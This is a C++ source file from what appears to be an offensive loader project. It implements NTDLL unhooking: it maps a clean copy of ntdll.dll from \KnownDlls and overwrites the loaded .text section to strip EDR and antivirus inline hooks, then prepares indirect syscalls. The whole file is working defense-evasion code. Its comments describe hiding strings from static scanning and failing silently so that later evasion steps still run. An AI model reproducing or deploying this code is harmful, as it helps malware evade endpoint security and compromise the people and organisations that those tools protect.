/**
 * @file ntdll_unhook.cpp
 * @brief NTDLL .text section unhooking via KnownDlls.
 *
 * EDR and AV vendors routinely install inline hooks (typically a 5-byte
 * `jmp rel32` or 14-byte absolute `mov rax; jmp rax`) at the top of Nt*
 * stubs in ntdll.dll so that user-mode API calls can be inspected before
 * reaching the syscall instruction. Those hooks live in the first few
 * bytes of each stub, inside the `.text` section of the mapped image.
 *
 * This module removes them by overlaying the in-memory `.text` section
 * with a clean copy of ntdll.dll obtained from the \KnownDlls section
 * directory. \KnownDlls is serviced by smss.exe at boot and holds
 * section objects for the core system DLLs; mapping a view of
 * \KnownDlls\ntdll.dll returns the pristine on-disk image without
 * touching the filesystem.
 *
 * Design tradeoffs:
 *
 *   - We use the (possibly hooked) NtProtectVirtualMemory / NtOpen*
 *     stubs from the currently-mapped ntdll to bootstrap. A hook that
 *     logs and passes through the call will telemeter the unhook
 *     operation, but it will not prevent it. A hook that actively
 *     rewrites the returned memory would defeat us, but none of the
 *     commodity EDRs do that - they would break the OS loader.
 *
 *   - We overwrite only the `.text` section. Import tables, rdata,
 *     data, and pdata stay intact, so ASLR-relocated state and TLS
 *     metadata are preserved.
 *
 *   - We bail out silently on any failure. The loader continues with
 *     hooks in place; downstream evasion still has a shot.
 */

#include "../../include/loader.hpp"
#include "../../include/evasion/evasion.hpp"
#include "../../include/evasion/syscalls.hpp"

#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE 0x00000040L
#endif

typedef NTSTATUS (NTAPI *typeNtOpenSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes
);

namespace erebus {
namespace evasion {

    BOOL UnhookNtdll()
    {
        // Resolve bootstrap functions from (possibly hooked) ntdll. We
        // accept that these first calls may traverse EDR hooks - after
        // the overlay completes, subsequent syscalls are clean.
        HMODULE ntdll = ImportModule("ntdll.dll");
        if (!ntdll) return FALSE;

        ImportFunction(ntdll, NtOpenSection, typeNtOpenSection);
        ImportFunction(ntdll, NtMapViewOfSection, typeNtMapViewOfSection);
        ImportFunction(ntdll, NtUnmapViewOfSection, typeNtUnmapViewOfSection);
        ImportFunction(ntdll, NtProtectVirtualMemory, typeNtProtectVirtualMemory);
        ImportFunction(ntdll, NtClose, typeNtClose);
        ImportFunction(ntdll, RtlInitUnicodeString, typeRtlInitUnicodeString);

        if (!NtOpenSection || !NtMapViewOfSection || !NtUnmapViewOfSection
            || !NtProtectVirtualMemory || !NtClose || !RtlInitUnicodeString)
        {
            return FALSE;
        }

        // Build the \KnownDlls\ntdll.dll object path at runtime from a
        // stack-resident wchar buffer so the literal never lands in
        // .rdata as a single contiguous string.
        WCHAR known_path[] = {
            L'\\', L'K', L'n', L'o', L'w', L'n', L'D', L'l', L'l', L's',
            L'\\', L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l',
            L'\0'
        };

        UNICODE_STRING us;
        RtlInitUnicodeString(&us, known_path);

        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

        HANDLE hSection = NULL;
        NTSTATUS status = NtOpenSection(&hSection, SECTION_MAP_READ, &oa);
        if (!NT_SUCCESS(status) || !hSection) return FALSE;

        PVOID cleanBase = NULL;
        SIZE_T cleanSize = 0;
        status = NtMapViewOfSection(
            hSection,
            (HANDLE)(LONG_PTR)-1,   // current process pseudo-handle
            &cleanBase,
            0,
            0,
            NULL,
            &cleanSize,
            (SECTION_INHERIT)ViewUnmap,
            0,
            PAGE_READONLY
        );
        NtClose(hSection);

        if (!NT_SUCCESS(status) || !cleanBase) return FALSE;

        // Parse both the loaded ntdll and the clean mapping as PE images.
        auto parsePe = [](PVOID base, PIMAGE_NT_HEADERS* outNt) -> BOOL {
            if (!base) return FALSE;
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
            if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)base + dos->e_lfanew);
            if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
            *outNt = nt;
            return TRUE;
        };

        PIMAGE_NT_HEADERS loadedNt = NULL;
        PIMAGE_NT_HEADERS cleanNt  = NULL;
        if (!parsePe((PVOID)ntdll, &loadedNt) || !parsePe(cleanBase, &cleanNt)) {
            NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, cleanBase);
            return FALSE;
        }

        // Walk the section table of the loaded image and overlay every
        // byte of `.text` with the corresponding bytes from the clean
        // mapping. `.text` is the only section that holds the syscall
        // stubs, so limiting the overlay there keeps us away from
        // runtime-mutated `.data` / `.rdata` (cookie state, TLS index).
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(loadedNt);
        BOOL any_overlay = FALSE;

        for (WORD i = 0; i < loadedNt->FileHeader.NumberOfSections; i++, section++)
        {
            // .text - section name is 8 bytes, zero-padded.
            if (!(section->Name[0] == '.' && section->Name[1] == 't'
                  && section->Name[2] == 'e' && section->Name[3] == 'x'
                  && section->Name[4] == 't'))
            {
                continue;
            }

            PVOID target = (PVOID)((PBYTE)ntdll    + section->VirtualAddress);
            PVOID clean  = (PVOID)((PBYTE)cleanBase + section->VirtualAddress);
            SIZE_T region = section->Misc.VirtualSize;
            if (region == 0) continue;

            // Flip .text to RW, overlay, then restore original protection
            // (expected to be PAGE_EXECUTE_READ). Going through
            // NtProtectVirtualMemory rather than VirtualProtect keeps the
            // flip off the Win32 API hook surface.
            PVOID protBase = target;
            SIZE_T protSize = region;
            ULONG oldProtect = 0;

            status = NtProtectVirtualMemory(
                (HANDLE)(LONG_PTR)-1,
                &protBase,
                &protSize,
                PAGE_EXECUTE_READWRITE,
                &oldProtect
            );
            if (!NT_SUCCESS(status)) continue;

            RtlCopyMemory(target, clean, region);
            any_overlay = TRUE;

            // Restore the original protection (almost always RX).
            protBase = target;
            protSize = region;
            ULONG dummy = 0;
            NtProtectVirtualMemory(
                (HANDLE)(LONG_PTR)-1,
                &protBase,
                &protSize,
                oldProtect,
                &dummy
            );
            break;  // only one .text section per PE
        }

        NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, cleanBase);

        // Now that the loaded ntdll .text is clean, extract SSNs and
        // plant indirect-syscall shims. Non-fatal on failure - the
        // hashed import macros still work against the (now unhooked)
        // stubs as a second-best path.
        if (any_overlay) {
            InitIndirectSyscalls();
        }

        return any_overlay;
    }

} // namespace evasion
} // namespace erebus
